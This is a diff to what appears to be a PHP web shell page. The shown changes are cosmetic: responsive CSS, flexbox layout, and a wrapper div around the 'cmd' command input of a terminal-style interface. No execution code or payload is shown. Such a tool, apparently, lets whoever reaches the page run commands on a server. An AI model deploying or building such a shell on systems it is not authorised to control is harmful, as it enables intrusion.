@@ -65,6 +65,9 @@ if (isset($_GET["feature"])) {
                 margin: 50px auto 0 auto;
                 box-shadow: 0 0 5px rgba(0, 0, 0, .3);
                 font-size: 10pt;
+                display: flex;
+                flex-direction: column;
+                align-items: stretch;
             }
 
             #shell-content {
@@ -72,12 +75,33 @@ if (isset($_GET["feature"])) {
                 overflow: auto;
                 padding: 5px;
                 white-space: pre-wrap;
+                flex-grow: 1;
             }
 
             #shell-logo {
                 font-weight: bold;
                 color: #FF4180;
                 text-align: center;
+            }
+
+            @media (max-width: 991px) {
+                #shell-logo {
+                    display: none;
+                }
+
+                html, body, #shell {
+                    height: 100%;
+                }
+
+                #shell {
+                    margin-top: 0;
+                }
+            }
+
+            @media (max-width: 767px) {
+                #shell-input {
+                    flex-direction: column;
+                }
             }
 
             .shell-prompt {
@@ -103,16 +127,21 @@ if (isset($_GET["feature"])) {
                 line-height: 30px;
             }
 
-            #shell-input > input {
-                flex-grow: 1;
+            #shell-input #shell-cmd {
                 height: 30px;
                 line-height: 30px;
-                padding: 0 5px;
                 border: none;
                 background: transparent;
                 color: #eee;
                 font-family: monospace;
                 font-size: 10pt;
+                width: 100%;
+                align-self: center;
+            }
+
+            #shell-input div {
+                flex-grow: 1;
+                align-items: stretch;
             }
         </style>
 
@@ -265,7 +294,9 @@ if (isset($_GET["feature"])) {
             </pre>
             <div id="shell-input">
                 <label for="shell-cmd" id="shell-prompt" class="shell-prompt">???</label>
-                <input id="shell-cmd" name="cmd" onkeydown="_onShellCmdKeyDown(event)"/>
+                <div>
+                    <input id="shell-cmd" name="cmd" onkeydown="_onShellCmdKeyDown(event)"/>
+                </div>
             </div>
         </div>
     </body>
